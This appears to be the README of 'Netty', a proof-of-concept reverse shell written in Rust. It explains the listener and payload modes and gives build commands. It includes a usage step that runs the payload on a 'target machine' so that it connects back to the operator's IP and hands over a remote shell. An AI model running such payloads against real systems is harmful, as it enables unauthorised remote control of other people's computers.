# Netty - A Proof-of-Concept TCP Reverse Shell

## Overview

Netty is a simple TCP reverse shell written in Rust. It consists of two main components: a listener and a payload. The
payload connects back to the listener, allowing the listener to execute commands on the payload's machine.

## Features

- **Listener Mode**: Waits for incoming connections on a specified IP address and port.
- **Payload Mode**: Connects to the listener and provides a remote shell.
- **Cross-Platform Shell**: Uses `/bin/sh` on Unix-like systems and `powershell.exe` on Windows.
- **Asynchronous I/O**: Built with `tokio` for non-blocking network operations.
- **Simple Command-Line Interface**: Easy-to-use CLI for starting the listener or the payload.

## How It Works

1. **The Listener**: You start the listener on your machine, specifying a port to listen on. It will wait for a TCP
   connection.

2. **The Payload**: You run the payload on the target machine, specifying the listener's IP address and port.

3. **The Connection**: The payload initiates a TCP connection to the listener.

4. **Remote Shell**: Once the connection is established, the listener can send shell commands to the payload. The
   payload executes these commands and sends the output back to the listener.

## Usage

First, clone the repository and build the project:

```bash
git clone <repository-url>
cd netty
cargo build --release
```

### 1. Start the Listener

On your machine, run the following command to start the listener on port `8080`:

```bash
./target/release/netty -l -p 8080
```

The listener will start and print "Listening...".

### 2. Run the Payload

On the target machine, run the following command, replacing `<your-ip>` with the IP address of the machine running the
listener:

```bash
./target/release/netty -a <your-ip> -p 8080
```

### 3. Execute Commands

Once the payload connects, you will see a "Connected to <ip>:<port>" message on the listener's terminal. You can now
type commands and press Enter to execute them on the target machine.

To close the connection, type `exit` in the listener's terminal.
